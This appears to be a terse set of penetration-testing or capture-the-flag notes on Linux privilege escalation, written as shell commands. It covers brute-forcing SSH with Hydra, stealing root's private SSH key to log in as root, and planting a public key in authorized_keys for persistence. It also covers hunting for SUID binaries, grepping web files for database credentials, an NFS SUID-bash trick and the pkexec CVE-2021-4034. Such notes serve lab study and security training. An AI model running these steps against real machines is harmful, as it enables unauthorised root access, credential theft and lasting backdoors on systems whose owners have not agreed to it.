
ssh user@IP -p xx

Sometimes we do not have the password, then we need to use Hydra to brute force

**Horizontal Escalation**
Escalate privilege from a "normal user" to a "another normal user"

**Command to check SUDO Privileges**
sudo -l

**Escalate privilege**
sudo -u "USERNAME" /bin/bash


**Vertical Escalation**
Escalate privilege from a "normal user" to a "root user"

Find for **.ssh** directory
Find the file id_rsa
cat id_rsa 
Copy entire id_rsa content
In my local terminal machine, create a new file and paste the content and save the file
Give permission on the file using the command chmod 600 id_rsa
ssh root@IP -p XXX -i id_rsa

**Persistence**
Find for **.ssh** directory
Find the **authorized_keys**
Update the content with your public key and save the file
ssh-keygen -f "KEY"

###################################################

**Check permissions**
ls -l
stat --help
stat -c "%a %A %U %G %F" "FILE NAME"

**Check Users' Groups**
groups "username"

**Check File Dependences**
strings "FILE NAME"

**Copy content to a new file**
cp /bin/bash "file name"

**Executing files**
./"file name"

/var/www/html
grep -nr "db_user"
/local/config/database

###################################################

LinEnum
LinPeas
chmod +x  "FILE"

###################################################
**SUID**
find  / -perm 4000 -ls 2>/dev/null

###################################################
**MOUNT**
showmount -e $IP => folder will be shown in here
mount -e ntfs $IP:/$folder /tmp/sharefolder
cp /bin/bash /tmp/sharefolder/bash
chmod +s /tmp/sharefolder/bash
Login via ssh
./bash -p

###################################################
**CVE-2021-4034**
pkexec